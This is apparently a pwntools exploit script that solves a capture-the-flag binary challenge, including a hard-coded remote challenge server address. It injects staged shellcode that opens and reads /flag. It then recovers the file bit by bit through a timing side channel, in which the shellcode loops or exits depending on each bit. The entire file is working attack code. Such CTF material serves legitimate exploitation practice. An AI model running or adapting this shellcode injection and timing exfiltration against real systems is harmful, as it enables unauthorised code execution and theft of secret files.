#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = ELF("./libc.so.6")

local = True 
if local:
    p = process("./chall_patched")
    #gdb.attach(p,'''b*main+548\nc\nb*0x1337000\nc''')
else:
    p = remote('103.162.14.240', 15000)

elf = context.binary = ELF('./chall_patched', checksec=False)

flag = b""

def get_byte(offset):
    bin_str = ''
    for bit_offset in range(8):
        p = remote('103.162.14.240', 15000)
        shellcode = b"\x31\xFF\x89\xD6\x0F\x05"
        p.send(shellcode)

        shellcode2 = asm(   
            shellcraft.open(b"/flag")
            +shellcraft.read("rax", "rsp", 0x200)
            +f"""
        main:
            mov al, [rsi+{offset}]
            shr al, {bit_offset}
            shl al, 7
            shr al, 7
            cmp al, 0
            je exit
            jmp main
        exit:
            """, arch='amd64')
        p.sendline(shellcode + shellcode2)
        start = time.time()
        p.recvall(timeout=1).decode()
        now = time.time()
        if (now - start) > 1:
            bin_str += '1'
        else:
            bin_str += '0'

    byte = int(bin_str[::-1], 2)
    return byte

for i in range(100):
    byte_flag = get_byte(i)
    flag += bytes([byte_flag])
    print(flag)
    if bytes([byte_flag]) == b"}":
        break
p.interactive()